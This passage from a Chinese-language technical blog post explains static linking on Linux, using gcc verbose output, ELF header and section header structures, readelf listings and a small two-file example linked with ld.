class="number">5</span>/../../../../lib/:/lib/x86_64-linux-gnu/:/lib/../lib/:/usr/lib/x86_64-linux-gnu/:/usr/lib/../lib/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../:/lib/:/usr/lib/</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-v&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/lto-wrapper -plugin-opt=-fresolution=/tmp/ccvOb2eL.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --sysroot=/ --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> -z relro /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/crt1.o /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/crtbegin.o -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span> -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../.. /tmp/ccyxTcBb.o -lgcc --as-needed -lgcc_s --no-as-needed -lc -lgcc --as-needed -lgcc_s --no-as-needed /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/crtend.o /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/crtn.o</span><br></pre></td></tr></table></figure><p>tmd，这合理吗? 哈，这很合理!</p><p>尝试着去看一下，会发现一些我们原本熟悉的东西</p><p>刚开始输出了一些我们gcc的版本信息等</p><p>熟悉的cc1去做预处理并对预处理过的文件做编译(不知道为什么没有看见cpp去做预处理的身影)，这一步是本身就极其复杂的，语法树什么的，更别提代码优化等等，具体的东西可能要去补补编译原理 ps:这学期给自己挖的坑够多了，只能下次一定</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/cc1 -quiet -v -imultiarch x86_64-linux-gnu test2.c -quiet -dumpbase test2.c -mtune=generic -march=x86<span class="number">-64</span> -auxbase test2 -version -fstack-protector-strong -Wformat -Wformat-security -o /tmp/ccZSA6XB.s</span><br></pre></td></tr></table></figure><p>打印出他搜索头文件的路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ignoring nonexistent directory &quot;/usr/local/include/x86_64-linux-gnu&quot;</span><br><span class="line">ignoring nonexistent directory &quot;/usr/lib/gcc/x86_64-linux-gnu/5/../../../../x86_64-linux-gnu/include&quot;</span><br><span class="line">#include &quot;...&quot; search starts here:</span><br><span class="line">#include &lt;...&gt; search starts here:</span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/5/include</span><br><span class="line"> /usr/local/include</span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/5/include-fixed</span><br><span class="line"> /usr/include/x86_64-linux-gnu</span><br><span class="line"> /usr/include</span><br><span class="line">End of search list.</span><br></pre></td></tr></table></figure><p>as 汇编器去做汇编，就是机械的翻译汇编到机器码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">as -v --64 -o /tmp/ccyxTcBb.o /tmp/ccZSA6XB.s</span><br></pre></td></tr></table></figure><p>后面从<code> /usr/lib/gcc/x86_64-linux-gnu/5/collect2</code>到最后<code>/x86_64-linux-gnu/crtn.o</code>都是在用collect2做链接 collect2是ld链接器的一个封装</p><p>我们要这次要研究的就是ld究竟怎么做的链接，怎么把多个可能互相引用的可重定位文件链接成一个可执行文件的</p><h2 id="重生之我是linker"><a href="#重生之我是linker" class="headerlink" title="重生之我是linker"></a>重生之我是linker</h2><p>把自己想象成linker，我们有的是可重定位目标文件，我们要把他变为可执行文件,首先要对有编译器和汇编器生成的可重定位目标文件做个了解，编译器给了他什么，如果什么都没有我们linker凭什么或者说何德何能把他变为可执行目标文件</p><p>linker: ?什么都没有?不好意思我做不到!</p><h3 id="Relocatable-object-file"><a href="#Relocatable-object-file" class="headerlink" title="Relocatable object file"></a>Relocatable object file</h3><p>ELF里的一些定义符号</p><pre><code>The following types are used for  N-bit  architectures  (N=32,64,  ElfNstands for Elf32 or Elf64, uintN_t stands for uint32_t or uint64_t):ElfN_Addr       Unsigned program address, uintN_tElfN_Off        Unsigned file offset, uintN_tElfN_Section    Unsigned section index, uint16_tElfN_Versym     Unsigned version symbol information, uint16_tElf_Byte        unsigned charElfN_Half       uint16_tElfN_Sword      int32_tElfN_Word       uint32_tElfN_Sxword     int64_tElfN_Xword      uint64_t</code></pre><p> simple_section.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_init_var = <span class="number">84</span>;</span><br><span class="line"><span class="type">int</span> global_uninit_var;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> global_static_var;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> reference_to_out;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var = <span class="number">85</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var2;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line"></span><br><span class="line">    func1(static_var + static_var2 + a + b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc -m32 -c simple_section.c</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; file simple_section.o</span><br><span class="line">simple_section.o: ELF <span class="number">32</span>-bit LSB relocatable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), not stripped</span><br></pre></td></tr></table></figure><p>ELF文件，链接我们依靠的是他的section head table ，linker哪里找到他呢?</p><p>ELF header里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT   16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT]; <span class="comment">/* ELF文件标识 */</span></span><br><span class="line">    Elf32_Half      e_type;             <span class="comment">/* 文件类型 */</span></span><br><span class="line">    Elf32_Half      e_machine;          <span class="comment">/* 机器类型 */</span></span><br><span class="line">    Elf32_Word      e_version;          <span class="comment">/* 文件版本 */</span></span><br><span class="line">    Elf32_Addr      e_entry;            <span class="comment">/* 程序入口地址 */</span></span><br><span class="line">    Elf32_Off       e_phoff;            <span class="comment">/* 程序头表偏移 */</span></span><br><span class="line">    Elf32_Off       e_shoff;            <span class="comment">/* 节头表偏移 */</span></span><br><span class="line">    Elf32_Word      e_flags;            <span class="comment">/* 文件标志 */</span></span><br><span class="line">    Elf32_Half      e_ehsize;           <span class="comment">/* ELF头大小 */</span></span><br><span class="line">    Elf32_Half      e_phentsize;        <span class="comment">/* 程序头表项大小 */</span></span><br><span class="line">    Elf32_Half      e_phnum;            <span class="comment">/* 程序头表项数量 */</span></span><br><span class="line">    Elf32_Half      e_shentsize;        <span class="comment">/* 节头表项大小 */</span></span><br><span class="line">    Elf32_Half      e_shnum;            <span class="comment">/* 节头表项数量 */</span></span><br><span class="line">    Elf32_Half      e_shstrndx;         <span class="comment">/* 节头表字符串表索引 */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p><code>e_shoff</code>(section header table offset)给出了在文件里的偏移，e_shnum，e_shentsize节头表项大小和数量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; readelf -h simple_section.o</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              REL (Relocatable file)</span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x0</span><br><span class="line">  Start of program headers:          0 (bytes into file)</span><br><span class="line">  Start of section headers:          868 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           0 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         13</span><br><span class="line">  Section header string table index: 10</span><br></pre></td></tr></table></figure><p>看一下各个section</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">There are 13 section headers, starting at offset 0x364:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .text             PROGBITS        00000000 000034 000062 00  AX  0   0  1</span><br><span class="line">  [ 2] .rel.text         REL             00000000 0002cc 000028 08   I 11   1  4</span><br><span class="line">  [ 3] .data             PROGBITS        00000000 000098 000008 00  WA  0   0  4</span><br><span class="line">  [ 4] .bss              NOBITS          00000000 0000a0 000008 00  WA  0   0  4</span><br><span class="line">  [ 5] .rodata           PROGBITS        00000000 0000a0 000004 00   A  0   0  1</span><br><span class="line">  [ 6] .comment          PROGBITS        00000000 0000a4 000036 01  MS  0   0  1</span><br><span class="line">  [ 7] .note.GNU-stack   PROGBITS        00000000 0000da 000000 00      0   0  1</span><br><span class="line">  [ 8] .eh_frame         PROGBITS        00000000 0000dc 000064 00   A  0   0  4</span><br><span class="line">  [ 9] .rel.eh_frame     REL             00000000 0002f4 000010 08   I 11   8  4</span><br><span class="line">  [10] .shstrtab         STRTAB          00000000 000304 00005f 00      0   0  1</span><br><span class="line">  [11] .symtab           SYMTAB          00000000 000140 000110 10     12  12  4</span><br><span class="line">  [12] .strtab           STRTAB          00000000 000250 000079 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>section head table可以理解为一个Elf32_Shdr结构体的数组 Elf32_Shdr结构来描述具体的section属性</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word  sh_name;        <span class="comment">// 节名称在 .shstrtab 节中的索引</span></span><br><span class="line">    Elf32_Word  sh_type;        <span class="comment">// 节类型</span></span><br><span class="line">    Elf32_Word  sh_flags;       <span class="comment">// 节标志</span></span><br><span class="line">    Elf32_Addr  sh_addr;        <span class="comment">// 节的内存地址</span></span><br><span class="line">    Elf32_Off   sh_offset;      <span class="comment">// 节在文件中的偏移量</span></span><br><span class="line">    Elf32_Word  sh_size;        <span class="comment">// 节的大小（字节数）</span></span><br><span class="line">    Elf32_Word  sh_link;        <span class="comment">// 链接到的其他节的索引</span></span><br><span class="line">    Elf32_Word  sh_info;        <span class="comment">// 额外信息</span></span><br><span class="line">    Elf32_Word  sh_addralign;   <span class="comment">// 对齐方式</span></span><br><span class="line">    Elf32_Word  sh_entsize;     <span class="comment">// 节包含实体的大小</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><strong>sh_name</strong></p><p>节名称在 .shstrtab 节中的索引， .shstrtab是节头表字符串表索引</p><p>具体来看下我们例子的 .shstrtab是的name是怎么解析的，linker首先从elf header里得到.shstrtab在section head table的第十个section e_shoff+e_shstrndx*e_shentsize&#x3D;904+10*40&#x3D;1304&#x3D;0x508,找到这个section的描述结构体</p><p><img src="/2023/04/28/static-link/image-20230428232104339.png" alt="image-20230428232104339"></p><p>前四个字节就是sh_name在.shstrtab 节中的索引，找到sh_offset为0x0328，即为shstrtab 节在文件中的位置，加上sh_name这个索引0x0328+0x11&#x3D;0x339</p><p><img src="/2023/04/28/static-link/image-20230428232706551.png" alt="image-20230428232706551"></p><p>就可以找到这个名字</p><p>之所以要这样这样存储名字，是因为我们的ELF必须要有一个对所有文件固定的格式，但是名字往往是不固定的长度，如果直接存储这个字符串，就不能用一个统一的结构体去描述，存储索引完美解决</p><p><strong>sh_type</strong></p><p>决定了节的类型 SHT_SYMTAB，SHT_RELA，SHT_DYNAMIC，SHT_REL等</p><p><strong>sh_flags</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SHF_WRITE     This section  contains  data  that  should  be writable during process execution.</span><br><span class="line"></span><br><span class="line">SHF_ALLOC      This  section  occupies  memory during process execution. Some  control  sections  <span class="keyword">do</span> notreside  in the memory image of an object file. This attribute is off <span class="keyword">for</span> those sections.表示该节在进程空间里要分配内存，有些节是一些控制信息不会被加载到进程空间，一般代码段数据段，和.bss段都会有这个表示，另外一些节完成任务之后就扔了尼，嘿嘿</span><br><span class="line"></span><br><span class="line">SHF_EXECINSTR  This  section  contains   executable   machineinstructions.</span><br><span class="line"></span><br><span class="line">SHF_MASKPROC   All  bits  included  in this mask are reserved <span class="keyword">for</span> processor-specific semantics.</span><br></pre></td></tr></table></figure><p><strong>sh_link</strong>和<strong>sh_info</strong>只有节的类型是与链接相关时才会有用</p><p><img src="/2023/04/28/static-link/image-20230429003128446.png" alt="image-20230429003128446"></p><p><strong>sh_entsize</strong></p><p>有一些节的内容是一张表，其中每一个表项的大小是固定的，比如符号表。 对于这种表来说，本成员指定其每一个表项的大小。</p><h3 id="static-link"><a href="#static-link" class="headerlink" title="static link"></a>static link</h3><p><strong>a.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> shared;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">6</span>;</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>b.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> shared = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span> &#123;</span><br><span class="line">    *a ^= *b ^= *a ^= *b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; gcc -m32 -fno-<span class="built_in">stack</span>-protector -c a.c b.c</span><br><span class="line">a.c: In function ‘main’:</span><br><span class="line">a.c:<span class="number">6</span>:<span class="number">5</span>: warning: implicit declaration of function ‘swap’ [-Wimplicit-function-declaration]</span><br><span class="line">     swap(&amp;a, &amp;shared);</span><br><span class="line">     ^</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; ld -m elf_i386 a.o b.o -e main -o  ab</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; file a.o b.o ab</span><br><span class="line">a.o: ELF <span class="number">32</span>-bit LSB relocatable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), not stripped</span><br><span class="line">b.o: ELF <span class="number">32</span>-bit LSB relocatable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), not stripped</span><br><span class="line">ab:  ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure><p>把canary关了，不然链接是找不到__stack_chk_fail，应为我们并没有ld标准链接库，</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; gcc -m32  -c a.c b.c</span><br><span class="line">a.c: In function ‘main’:</span><br><span class="line">a.c:6:5: warning: implicit declaration of function ‘swap’ [-Wimplicit-function-declaration]</span><br><span class="line">     swap(&amp;a, &amp;shared);</span><br><span class="line">     ^</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; checksec a.o</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/link-load-library-code/chapter4/a.o&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; gcc -m32 -fno-stack-protector -c a.c b.c</span><br><span class="line">a.c: In function ‘main’:</span><br><span class="line">a.c:6:5: warning: implicit declaration of function ‘swap’ [-Wimplicit-function-declaration]</span><br><span class="line">     swap(&amp;a, &amp;shared);</span><br><span class="line">     ^</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; checksec a.o</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/link-load-library-code/chapter4/a.o&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>ld时-e指定下入口为mian，不然ld时找不到默认的_start</p><p>gcc11.3还需要-fno-pie把pie关了,不然他的重定位类型似乎是按照共享库来的，我们先搞静态，gcc5加不加都行</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -S a.o</span><br><span class="line">There are <span class="number">12</span> section headers, starting at offset <span class="number">0x220</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS        <span class="number">00000000</span> <span class="number">000034</span> <span class="number">000039</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .rel.text         REL             <span class="number">00000000</span> <span class="number">0001b</span>0 <span class="number">000010</span> <span class="number">08</span>   I <span class="number">10</span>   <span class="number">1</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .data             PROGBITS        <span class="number">00000000</span> <span class="number">00006</span>d <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">4</span>] .bss              NOBITS          <span class="number">00000000</span> <span class="number">00006</span>d <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">00006</span>d <span class="number">000036</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .note.GNU-<span class="built_in">stack</span>   PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>a3 <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">7</span>] .eh_frame         PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>a4 <span class="number">000044</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">8</span>] .rel.eh_frame     REL             <span class="number">00000000</span> <span class="number">0001</span>c0 <span class="number">000008</span> <span class="number">08</span>   I <span class="number">10</span>   <span class="number">7</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">9</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">0001</span>c8 <span class="number">000057</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [<span class="number">10</span>] .symtab           SYMTAB          <span class="number">00000000</span> <span class="number">0000e8</span> <span class="number">0000b</span>0 <span class="number">10</span>     <span class="number">11</span>   <span class="number">8</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">11</span>] .strtab           STRTAB          <span class="number">00000000</span> <span class="number">000198</span> <span class="number">000016</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -S b.o</span><br><span class="line">There are <span class="number">11</span> section headers, starting at offset <span class="number">0x1f4</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS        <span class="number">00000000</span> <span class="number">000034</span> <span class="number">000039</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .data             PROGBITS        <span class="number">00000000</span> <span class="number">000070</span> <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .bss              NOBITS          <span class="number">00000000</span> <span class="number">000074</span> <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">4</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">000074</span> <span class="number">000036</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .note.GNU-<span class="built_in">stack</span>   PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>aa <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .eh_frame         PROGBITS        <span class="number">00000000</span> <span class="number">0000</span>ac <span class="number">000038</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">7</span>] .rel.eh_frame     REL             <span class="number">00000000</span> <span class="number">000198</span> <span class="number">000008</span> <span class="number">08</span>   I  <span class="number">9</span>   <span class="number">6</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">8</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">0001</span>a0 <span class="number">000053</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">9</span>] .symtab           SYMTAB          <span class="number">00000000</span> <span class="number">0000e4</span> <span class="number">0000</span>a0 <span class="number">10</span>     <span class="number">10</span>   <span class="number">8</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">10</span>] .strtab           STRTAB          <span class="number">00000000</span> <span class="number">000184</span> <span class="number">000011</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter4&gt; readelf -S ab</span><br><span class="line">There are <span class="number">8</span> section headers, starting at offset <span class="number">0x2e4</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS        <span class="number">08048094</span> <span class="number">000094</span> <span class="number">000072</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .eh_frame         PROGBITS        <span class="number">08048108</span> <span class="number">000108</span> <span class="number">000064</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .data             PROGBITS        <span class="number">0804916</span>c <span class="number">00016</span>c <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .comment          PROGBITS        <span class="number">00000000</span> <span class="number">000170</span> <span class="number">000035</span> <span class="number">01</span>  MS  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">5</span>] .shstrtab         STRTAB          <span class="number">00000000</span> <span class="number">0002</span>aa <span class="number">00003</span>a <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .symtab           SYMTAB          <span class="number">00000000</span> <span class="number">0001</span>a8 <span class="number">0000</span>d0 <span class="number">10</span>      <span class="number">7</span>   <span class="number">7</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">7</span>] .strtab           STRTAB          <span class="number">00000000</span> <span class="number">000278</span> <span class="number">000032</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><h4 id="空间与地址分配"><a href="#空间与地址分配" class="headerlink" title="空间与地址分配"></a>空间与地址分配</h4><p>linker把所有的输入目标文件相同的节合并成一个，从大小也可以看出来是合并了，然后重新生成一个elf header来帮助我们加载时找到新段</p><h4 id="符号解析与重定位"><a href="#符号解析与重定位" class="headerlink" title="符号解析与重定位"></a>符号解析与重定位</h4><p>链接的本质就是把不同目标文件粘在一起，符号是粘合剂，符号包括变量名，函数名，还有段名等等，符号标记了各种信息，他被存储在我们的.symtab section标志的符号表里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word    st_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">    Elf32_Addr    st_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">    Elf32_Word    st_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">    Elf32_Section    st_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p><strong>st_name</strong></p><p>在.strtab 字符串表里的下标</p><p><strong>st_shndx</strong></p><ul><li>符号定义在本文件<ul><li>符号所在段下标</li></ul></li><li>不在本文文件或者某些特殊值<ul><li>SHN_ABS 